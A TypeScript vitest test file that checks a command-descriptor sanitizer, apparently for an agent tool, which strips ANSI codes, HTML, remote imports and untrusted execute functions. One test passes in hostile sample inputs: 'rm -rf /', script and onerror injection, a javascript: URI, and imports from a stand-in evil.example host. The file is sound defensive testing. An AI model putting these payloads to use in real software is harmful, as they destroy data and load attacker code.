import { describe, expect, it } from 'vitest';
import { sanitizeCommandDescriptor } from '../src/index';

describe('descriptor sanitizer', () => {
  it('accepts a plain description, icon, and category as display-only', () => {
    const sanitized = sanitizeCommandDescriptor({
      description: 'Switch agent thread',
      icon: 'thread',
      category: 'session',
    });

    expect(sanitized.description).toBe('Switch agent thread');
    expect(sanitized.icon).toBe('thread');
    expect(sanitized.category).toBe('session');
    expect(sanitized.trustedForExecution).toBe(false);
    expect(sanitized.rejected).toEqual([]);
  });

  it('rejects ANSI, HTML, remote code, dynamic import, and shortcut injection', () => {
    const malicious = sanitizeCommandDescriptor({
      description: '\u001b[31mrm -rf /\u001b[0m <script>alert(1)</script> https://evil.example/payload.js',
      icon: 'javascript:alert(1)',
      category: '<img src=x onerror=import("https://evil.example/x.js")>',
      shortcut: 'globalShortcut.register("Ctrl+Alt+X")',
      importSpecifier: 'https://evil.example/plugin.js',
      execute: () => 'pwn',
    });

    expect(malicious.trustedForExecution).toBe(false);
    expect(malicious.icon).toBeNull();
    expect(malicious.category).toBe('other');
    expect(malicious.description).not.toContain('\u001b');
    expect(malicious.description).not.toContain('<script>');
    expect(malicious.rejected).toEqual(expect.arrayContaining([
      'ansi',
      'html',
      'remote-code',
      'dynamic-import',
      'global-shortcut',
      'untrusted-execute',
    ]));
  });

  it('does not let an untrusted descriptor change execution', () => {
    const sanitized = sanitizeCommandDescriptor({
      description: 'Looks helpful',
      execute: () => {
        throw new Error('untrusted execute must not run');
      },
    });

    expect(sanitized.trustedForExecution).toBe(false);
    expect(sanitized.rejected).toContain('untrusted-execute');
  });
});
